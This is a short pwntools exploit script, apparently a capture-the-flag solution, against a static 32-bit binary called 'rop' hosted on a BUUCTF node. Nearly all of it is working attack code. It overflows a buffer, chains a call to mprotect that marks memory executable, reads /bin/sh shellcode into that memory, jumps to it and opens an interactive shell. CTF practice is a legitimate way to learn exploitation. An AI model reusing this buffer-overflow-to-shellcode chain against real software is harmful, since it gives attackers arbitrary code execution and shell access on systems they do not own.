#Made by fly_autumn
#x86 static mprotect
from pwn import *
p = process("./rop")
p = remote("node5.buuoj.cn",27077)
elf = ELF("./rop")
context(os="linux",arch="i386")

mpro_addr = 0x806dda0
main_addr = elf.sym["main"]
addr = 0x80e9000
read_addr = elf.sym["read"]


offset = 16
payload = b"\x00" * offset + p32(mpro_addr) + p32(main_addr) + p32(addr) + p32(0x1000) + p32(7)
p.sendline(payload)
payload2 = b"\x00" * offset + p32(read_addr) + p32(main_addr) + p32(0) + p32(addr) + p32(0x100)
p.sendline(payload2)
shellcode = asm(shellcraft.sh())
p.sendline(shellcode)
payload3 = b"\x00" * offset + p32(addr)
p.sendline(payload3)

p.interactive()
